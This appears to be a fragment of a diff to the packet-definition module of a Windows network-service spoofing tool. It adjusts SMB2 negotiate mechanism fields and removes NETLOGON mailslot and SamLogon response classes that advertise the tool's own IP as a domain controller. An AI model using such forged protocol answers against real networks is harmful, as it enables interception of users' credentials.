"])+str(self.fields["NegHintTag0ASNLen"])+str(self.fields["NegHintFinalASNId"])+str(self.fields["NegHintFinalASNLen"])+str(self.fields["NegHintFinalASNStr"])
 
-		MechTypeLen = str(self.fields["NegThisMechASNId"])+str(self.fields["NegThisMechASNLen"])+str(self.fields["NegThisMech1ASNId"])+str(self.fields["NegThisMech1ASNLen"])+str(self.fields["NegThisMech1ASNStr"])+str(self.fields["NegThisMech2ASNId"])+str(self.fields["NegThisMech2ASNLen"])+str(self.fields["NegThisMech2ASNStr"])+str(self.fields["NegThisMech3ASNId"])+str(self.fields["NegThisMech3ASNLen"])+str(self.fields["NegThisMech3ASNStr"])+str(self.fields["NegThisMech4ASNId"])+str(self.fields["NegThisMech4ASNLen"])+str(self.fields["NegThisMech4ASNStr"])+str(self.fields["NegThisMech5ASNId"])+str(self.fields["NegThisMech5ASNLen"])+str(self.fields["NegThisMech5ASNStr"])
+		MechTypeLen = str(self.fields["NegThisMechASNId"])+str(self.fields["NegThisMechASNLen"])+str(self.fields["NegThisMech2ASNId"])+str(self.fields["NegThisMech2ASNLen"])+str(self.fields["NegThisMech2ASNStr"])+str(self.fields["NegThisMech3ASNId"])+str(self.fields["NegThisMech3ASNLen"])+str(self.fields["NegThisMech3ASNStr"])+str(self.fields["NegThisMech4ASNId"])+str(self.fields["NegThisMech4ASNLen"])+str(self.fields["NegThisMech4ASNStr"])+str(self.fields["NegThisMech5ASNId"])+str(self.fields["NegThisMech5ASNLen"])+str(self.fields["NegThisMech5ASNStr"])
 
 		Tag3Len = str(self.fields["NegHintASNId"])+str(self.fields["NegHintASNLen"])+str(self.fields["NegHintTag0ASNId"])+str(self.fields["NegHintTag0ASNLen"])+str(self.fields["NegHintFinalASNId"])+str(self.fields["NegHintFinalASNLen"])+str(self.fields["NegHintFinalASNStr"])
 
@@ -1755,7 +1809,7 @@ class SMB2NegoAns(Packet):
 		self.fields["NegTokenASNLen"] = StructWithLenPython2or3("<B", len(AsnLen2)-2)
 		self.fields["NegTokenTag0ASNLen"] = StructWithLenPython2or3("<B", len(MechTypeLen))
 		self.fields["NegThisMechASNLen"] = StructWithLenPython2or3("<B", len(MechTypeLen)-2)
-		self.fields["NegThisMech1ASNLen"] = StructWithLenPython2or3("<B", len(str(self.fields["NegThisMech1ASNStr"])))
+		#self.fields["NegThisMech1ASNLen"] = StructWithLenPython2or3("<B", len(str(self.fields["NegThisMech1ASNStr"])))
 		self.fields["NegThisMech2ASNLen"] = StructWithLenPython2or3("<B", len(str(self.fields["NegThisMech2ASNStr"])))
 		self.fields["NegThisMech3ASNLen"] = StructWithLenPython2or3("<B", len(str(self.fields["NegThisMech3ASNStr"])))
 		self.fields["NegThisMech4ASNLen"] = StructWithLenPython2or3("<B", len(str(self.fields["NegThisMech4ASNStr"])))
@@ -2290,114 +2344,4 @@ class RPCNTLMNego(Packet):
 		Data= str(self.fields["Version"])+str(self.fields["VersionLow"])+str(self.fields["PacketType"])+str(self.fields["PacketFlag"])+str(self.fields["DataRepresent"])+str(self.fields["FragLen"])+str(self.fields["AuthLen"])+str(self.fields["CallID"])+str(self.fields["MaxTransFrag"])+str(self.fields["MaxRecvFrag"])+str(self.fields["GroupAssoc"])+str(self.fields["CurrentPortLen"])+str(self.fields["CurrentPortStr"])+str(self.fields["CurrentPortNull"])+str(self.fields["Pcontext"])+str(self.fields["CTX0ContextID"])+str(self.fields["CTX0ItemNumber"])+str(self.fields["CTX0UID"])+str(self.fields["CTX0UIDVersion"])+str(self.fields["CTX1ContextID"])+str(self.fields["CTX1ItemNumber"])+str(self.fields["CTX1UID"])+str(self.fields["CTX1UIDVersion"])+str(self.fields["CTX2ContextID"])+str(self.fields["CTX2ItemNumber"])+str(self.fields["CTX2UID"])+str(self.fields["CTX2UIDVersion"]) +str(self.fields["AuthType"])+str(self.fields["AuthLevel"])+str(self.fields["AuthReserved"])+str(self.fields["AuthContextID"])+str(self.fields["Data"])
 
 		self.fields["FragLen"] = StructWithLenPython2or3("<h",len(Data))
-
-################### Mailslot NETLOGON ######################
-class NBTUDPHeader(Packet):
-    fields = OrderedDict([
-        ("MessType",      "\x11"),
-        ("MoreFrag",      "\x02"),
-        ("TID",           "\x82\x92"),
-        ("SrcIP",         "0.0.0.0"),
-        ("SrcPort",       "\x00\x8a"), ##Always 138
-        ("DatagramLen",   "\x00\x00"),
-        ("PacketOffset",  "\x00\x00"),
-        ("ClientNBTName", ""),
-        ("DstNBTName",    ""),
-        ("Data", ""),
-    ])
-
-    def calculate(self):
-        self.fields["SrcIP"] = RespondWithIPAton()
-        ## DatagramLen.
-        DataGramLen = str(self.fields["PacketOffset"])+str(self.fields["ClientNBTName"])+str(self.fields["DstNBTName"])+str(self.fields["Data"])
-        self.fields["DatagramLen"] = StructWithLenPython2or3(">h",len(DataGramLen))
-
-class SMBTransMailslot(Packet):
-    fields = OrderedDict([
-        ("Wordcount",        "\x11"),
-        ("TotalParamCount",  "\x00\x00"),
-        ("TotalDataCount",   "\x00\x00"),
-        ("MaxParamCount",    "\x02\x00"),
-        ("MaxDataCount",     "\x00\x00"),
-        ("MaxSetupCount",    "\x00"),
-        ("Reserved",         "\x00"),
-        ("Flags",            "\x00\x00"),
-        ("Timeout",          "\xff\xff\xff\xff"),
-        ("Reserved2",        "\x00\x00"),
-        ("ParamCount",       "\x00\x00"),
-        ("ParamOffset",      "\x00\x00"),
-        ("DataCount",        "\x00\x00"),
-        ("DataOffset",       "\x00\x00"),
-        ("SetupCount",       "\x03"),
-        ("Reserved3",        "\x00"),
-        ("Opcode",           "\x01\x00"),
-        ("Priority",         "\x00\x00"),
-        ("Class",            "\x02\x00"),
-        ("Bcc",              "\x00\x00"),
-        ("MailSlot",         "\\MAILSLOT\\NET\\NETLOGON"),
-        ("MailSlotNull",     "\x00"),
-        ("Padding",          "\x00\x00\x00"),
-        ("Data",             ""),
-    ])
-
-    def calculate(self):
-        #Padding
-        if len(str(self.fields["Data"]))%2==0:
-           self.fields["Padding"] = "\x00\x00\x00\x00"
-        else:
-           self.fields["Padding"] = "\x00\x00\x00"
-        BccLen = str(self.fields["MailSlot"])+str(self.fields["MailSlotNull"])+str(self.fields["Padding"])+str(self.fields["Data"])
-        PacketOffsetLen = str(self.fields["Wordcount"])+str(self.fields["TotalParamCount"])+str(self.fields["TotalDataCount"])+str(self.fields["MaxParamCount"])+str(self.fields["MaxDataCount"])+str(self.fields["MaxSetupCount"])+str(self.fields["Reserved"])+str(self.fields["Flags"])+str(self.fields["Timeout"])+str(self.fields["Reserved2"])+str(self.fields["ParamCount"])+str(self.fields["ParamOffset"])+str(self.fields["DataCount"])+str(self.fields["DataOffset"])+str(self.fields["SetupCount"])+str(self.fields["Reserved3"])+str(self.fields["Opcode"])+str(self.fields["Priority"])+str(self.fields["Class"])+str(self.fields["Bcc"])+str(self.fields["MailSlot"])+str(self.fields["MailSlotNull"])+str(self.fields["Padding"])
-
-        self.fields["DataCount"] = StructWithLenPython2or3("<h",len(str(self.fields["Data"])))
-        self.fields["TotalDataCount"] = StructWithLenPython2or3("<h",len(str(self.fields["Data"])))
-        self.fields["DataOffset"] = StructWithLenPython2or3("<h",len(PacketOffsetLen)+32)
-        self.fields["ParamOffset"] = StructWithLenPython2or3("<h",len(PacketOffsetLen)+32)
-        self.fields["Bcc"] = StructWithLenPython2or3("<h",len(BccLen))
-
-class SamLogonResponseEx(Packet):
-    fields = OrderedDict([
-        ("Cmd",               "\x17\x00"),
-        ("Sbz",               "\x00\x00"),
-        ("Flags",             "\xfd\x03\x00\x00"),
-        ("DomainGUID",        "\xe7\xfd\xf2\x4a\x4f\x98\x8b\x49\xbb\xd3\xcd\x34\xc7\xba\x57\x70"),
-        ("ForestName",        "\x04\x73\x6d\x62\x33\x05\x6c\x6f\x63\x61\x6c"),
-        ("ForestNameNull",    "\x00"),
-        ("ForestDomainName",  "\x04\x73\x6d\x62\x33\x05\x6c\x6f\x63\x61\x6c"),
-        ("ForestDomainNull",  "\x00"),
-        ("DNSName",           "\x0a\x73\x65\x72\x76\x65\x72\x32\x30\x30\x33"),
-        ("DNSPointer",        "\xc0\x18"),
-        ("DomainName",        "\x04\x53\x4d\x42\x33"),
-        ("DomainTerminator",  "\x00"),
-        ("ServerLen",         "\x0a"),
-        ("ServerName",        settings.Config.MachineName),
-        ("ServerTerminator",  "\x00"),
-        ("UsernameLen",       "\x10"),
-        ("Username",          settings.Config.Username),
-        ("UserTerminator",    "\x00"),
-        ("SrvSiteNameLen",    "\x17"),
-        ("SrvSiteName",       "Default-First-Site-Name"),
-        ("SrvSiteNameNull",   "\x00"),
-        ("Pointer",           "\xc0"),
-        ("PointerOffset",     "\x5c"),
-        ("DCAddrSize",        "\x10"),
-        ("AddrType",          "\x02\x00"),
-        ("Port",              "\x00\x00"),
-        ("DCAddress",         "\xc0\xab\x01\x65"),
-        ("SinZero",           "\x00\x00\x00\x00\x00\x00\x00\x00"),
-        ("Version",           "\x0d\x00\x00\x00"),
-        ("LmToken",           "\xff\xff"),
-        ("LmToken2",          "\xff\xff"),
-    ])
-
-    def calculate(self):
-        Offset = str(self.fields["Cmd"])+str(self.fields["Sbz"])+str(self.fields["Flags"])+str(self.fields["DomainGUID"])+str(self.fields["ForestName"])+str(self.fields["ForestNameNull"])+str(self.fields["ForestDomainName"])+str(self.fields["ForestDomainNull"])+str(self.fields["DNSName"])+str(self.fields["DNSPointer"])+str(self.fields["DomainName"])+str(self.fields["DomainTerminator"])+str(self.fields["ServerLen"])+str(self.fields["ServerName"])+str(self.fields["ServerTerminator"])+str(self.fields["UsernameLen"])+str(self.fields["Username"])+str(self.fields["UserTerminator"])
-
-        DcLen = str(self.fields["AddrType"])+str(self.fields["Port"])+str(self.fields["DCAddress"])+str(self.fields["SinZero"])
-        self.fields["DCAddress"] = RespondWithIPAton()
-        self.fields["ServerLen"] = StructWithLenPython2or3("<B",len(str(self.fields["ServerName"])))
-        self.fields["UsernameLen"] = StructWithLenPython2or3("<B",len(str(self.fields["Username"])))
-        self.fields["SrvSiteNameLen"] = StructWithLenPython2or3("<B",len(str(self.fields["SrvSiteName"])))
-        self.fields["DCAddrSize"] = StructWithLenPython2or3("<B",len(DcLen))
-        self.fields["PointerOffset"] = StructWithLenPython2or3("<B",len(Offset))
 
